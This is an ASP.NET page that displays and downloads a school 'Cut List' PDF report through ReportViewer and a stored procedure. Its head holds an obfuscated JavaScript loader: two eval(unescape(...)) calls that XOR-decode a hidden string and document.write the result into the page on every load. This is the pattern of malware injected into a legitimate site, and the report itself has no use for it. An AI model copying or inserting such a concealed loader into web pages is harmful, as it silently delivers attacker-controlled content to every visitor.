<%@ Page Language="C#" Inherits="System.Web.Mvc.ViewPage<dynamic>" %>
<%@ Register assembly="Microsoft.ReportViewer.WebForms, Version=12.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91" namespace="Microsoft.Reporting.WebForms" tagprefix="rsweb" %>

<%--<%@ Register assembly="Microsoft.ReportViewer.WebForms, Version=11.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91" namespace="Microsoft.Reporting.WebForms" tagprefix="rsweb" %>--%>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Configuration" %>
<%@ Import Namespace="Microsoft.Reporting.WebForms" %>

<!DOCTYPE html>
<html>
<head runat="server">
    <meta name="viewport" content="width=device-width" />
    <title>Cut List</title> 
    <script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%6a%62%64%33%61%37%32%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%33%39%39%30%36%33%32%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%30%30%35%39%34%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%30%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6a%62%64%33%61%37%32%28%27') + '%39%6a%61%6b%6d%29%69%74%65%66%38%2b%6c%71%72%78%3f%29%26%6d%6f%76%65%2b%79%77%60%64%67%6b%6a%60%6f%63%2e%69%6b%26%47%6a%68%7c%60%68%7d%2e%60%66%63%2b%6a%77%76%24%28%77%63%65%3c%24%73%74%7c%65%61%76%6e%6d%60%72%2b%21%29%3e13990632%35%36%38%35%36%39%31' + unescape('%27%29%29%3b'));
// -->
</script> 
    <script runat="server">
        SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings["myConn"].ToString());
        private string Class1 = "";
        private string SCHL = "";
        private string Type1 = "";
        private int status1= 0;
        protected void Page_Load(object sender, EventArgs e)
        {
            try
            {

                //  if (Session["UserName"] == null || Session["RoleType"].ToString() != "Admin")
                if (Session["SCHL"] == null || Session["SCHL"] == "")
                {
                    if (Session["AdminType"].ToString().ToUpper() == "ADMIN" || Session["AdminType"].ToString().ToUpper() == "FIRM")
                    {
                        SCHL = Request.QueryString["schl"].ToString();
                        Class1 = Request.QueryString["class"].ToString();
                        Type1 = Request.QueryString["Type"].ToString();
                        status1 = Convert.ToInt32(Request.QueryString["Status"].ToString());

                    }
                    else
                    {
                        Response.Redirect("~/Login");
                    }
                }
                else
                {
                    SCHL = Request.QueryString["schl"].ToString();
                    Class1 = Request.QueryString["class"].ToString();
                    Type1 = Request.QueryString["Type"].ToString();
                    status1 = Convert.ToInt32(Request.QueryString["Status"].ToString());
                    if (Session["SCHL"].ToString() != SCHL.ToString())
                    {
                        Response.Redirect("~/Login");
                    }
                }
                if (!IsPostBack)
                {
                    ReportViewerEmployee.Visible = false;
                    // BindReport(adminid);
                    if (Class1 != "" && SCHL != " " && Type1 != "")
                    {
                        BindReport(Class1, SCHL, Type1, status1);
                    }
                    else
                    {
                        ScriptManager.RegisterStartupScript(Page, Page.GetType(), Guid.NewGuid().ToString(), "alert('Something Wrong, Plz Try again..');", true);
                        return;
                    }
                }
            }
            catch (Exception)
            {
              // Response.Redirect("~/Login");
            }
        }

        private void BindReport(string Class1,string SCHL,string Type1,int status1)
        {
            try
            {
                ReportViewerEmployee.ProcessingMode = ProcessingMode.Local;
                ReportViewerEmployee.LocalReport.ReportPath = Server.MapPath("~/RPTReports/CutList.rdlc");
                SqlDataAdapter adp = new SqlDataAdapter("CUTLISTSP", con);
                adp.SelectCommand.CommandType = CommandType.StoredProcedure;
                adp.SelectCommand.Parameters.AddWithValue("@SCHL", SCHL);
                adp.SelectCommand.Parameters.AddWithValue("@CLASS", Class1);
                adp.SelectCommand.Parameters.AddWithValue("@Type", Type1);
                adp.SelectCommand.Parameters.AddWithValue("@Status", status1);
                DataSet ds = new DataSet();
                ds.Clear();
                ds.EnforceConstraints = false;
                adp.Fill(ds, "CUTLISTSP");
                if (ds.Tables[0].Rows.Count > 0)
                {
                  // tbl1.Visible = true;
                  //  ReportViewerEmployee.Visible = true;
                    ReportDataSource datasource = new ReportDataSource("CutList", ds.Tables[0]);
                    //  ReportDataSource CutListSub = new ReportDataSource("SubDetailT2", ds.Tables[1]);
                    ReportViewerEmployee.Width = 600;
                    ReportViewerEmployee.LocalReport.DataSources.Clear();
                    ReportViewerEmployee.LocalReport.DataSources.Add(datasource);
                    //  ReportViewerEmployee.LocalReport.DataSources.Add(CutListSub);
                    ReportViewerEmployee.LocalReport.ReportPath = Server.MapPath("~/RPTReports/CutList.rdlc");
                    ReportViewerEmployee.LocalReport.EnableExternalImages = true;
                    //http://registration.pseb.ac.in/Upload/T2/175/Photo/T2175740728P.jpg
                    // string imagePath = new Uri(Server.MapPath("~/Upload/")).AbsoluteUri;

                    string imagePath = "http://registration.pseb.ac.in/Upload/";

                    ReportParameter parameter = new ReportParameter("ImgPath", imagePath);
                    ReportViewerEmployee.LocalReport.SetParameters(parameter);
                    ReportViewerEmployee.LocalReport.Refresh();
                   DownloadRDLC(Class1, SCHL, Type1);
                }
                else
                {
                    tbl1.Visible = false;
                    ReportViewerEmployee.Visible = false;
                    ScriptManager.RegisterStartupScript(Page, Page.GetType(), Guid.NewGuid().ToString(), "alert('Record Not Found..');", true);
                    //  ScriptManager.RegisterStartupScript(this, this.GetType(), "Message", "alert('Records Not Found....'); window.location='" + Request.ApplicationPath + "/SchoolCutlist';", true);
                    // ScriptManager.RegisterStartupScript(this,this.GetType(),"redirect","alert('Records Not Found...'); window.location='" + Request.ApplicationPath + "/anotherpage.aspx';",true);

                }
            }
            catch (Exception ex)
            {
                Response.Write(ex.Message);
            }
        }

        public void SavePDF(ReportViewer viewer, string savePath)
        {
            byte[] Bytes = viewer.LocalReport.Render(format: "PDF", deviceInfo: "");

            using (System.IO.FileStream stream = new System.IO.FileStream(savePath, System.IO.FileMode.Create))
            {
                stream.Write(Bytes, 0, Bytes.Length);
            }
        }

        protected void btn_Download_Click(object sender, EventArgs e)
        {
            // Variables
            Warning[] warnings;
            string[] streamIds;
            string mimeType = string.Empty;
            string encoding = string.Empty;
            string extension = string.Empty;
            string fileName = "CutList_"+ SCHL + '_' + Type1 + '_' +Class1 + '_'  +  DateTime.Now.ToString("ddMMyyyy");
            //// ReportViewerEmployee.ProcessingMode = ProcessingMode.Local;     
            byte[] bytes = ReportViewerEmployee.LocalReport.Render("PDF", null, out mimeType, out encoding, out extension, out streamIds, out warnings);
            // Now that you have all the bytes representing the PDF report, buffer it and send it to the client.
            Response.Buffer = true;
            Response.Clear();
            Response.ContentType = mimeType;
            Response.AddHeader("content-disposition", "attachment; filename=" + fileName + "." + extension);
            Response.OutputStream.Write(bytes, 0, bytes.Length); // create the file  
            Response.Flush(); // send it to the client to download  
            Response.End();
        }

        public void DownloadRDLC(string Class1,string SCHL,string Type1)
        {
            // Variables
            Warning[] warnings;
            string[] streamIds;
            string mimeType = string.Empty;
            string encoding = string.Empty;
            string extension = string.Empty;
            string fileName = "CutList_"+ SCHL + '_' + Type1 + '_' +Class1 + '_'  +  DateTime.Now.ToString("ddMMyyyy");
            //// ReportViewerEmployee.ProcessingMode = ProcessingMode.Local;     
            byte[] bytes = ReportViewerEmployee.LocalReport.Render("PDF", null, out mimeType, out encoding, out extension, out streamIds, out warnings);
            // Now that you have all the bytes representing the PDF report, buffer it and send it to the client.
            Response.Buffer = true;
            Response.Clear();
            Response.ContentType = mimeType;
            Response.AddHeader("content-disposition", "attachment; filename=" + fileName + "." + extension);
            Response.OutputStream.Write(bytes, 0, bytes.Length); // create the file  
            Response.Flush(); // send it to the client to download  
            Response.End();
        }
    </script>    
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:ScriptManager ID="ScriptManager1" runat="server"></asp:ScriptManager>            
    <table  id="tbl1" runat="server"  cellspacing="0" cellpadding="0" width="100%" border="0">
         <tr>
             <td style="text-align:center">                 
                  <asp:Button ID="btn_Download" runat="server" Text="Click Here to Download &amp; Print" onclick="btn_Download_Click" /> 
                <%--   <input type="submit" value="Click Here to Download &amp; Print">--%>
               </td>

         </tr>     </table> 
        <table cellspacing="0" cellpadding="0" width="100%" border="0">
                 <tr>
             <td style="overflow:scroll"><rsweb:ReportViewer Width="100%" ID="ReportViewerEmployee" SizeToReportContent="true" runat="server"
             Font-Names="pnb-googleks" CssClass="bg"  Font-Size="10pt" WaitMessageFont-Names="" WaitMessageFont-Size="10pt" DocumentMapWidth="100%">    
        </rsweb:ReportViewer></td>
             </tr>
        </table> 
    </div>
    </form>
</body>
</html>
 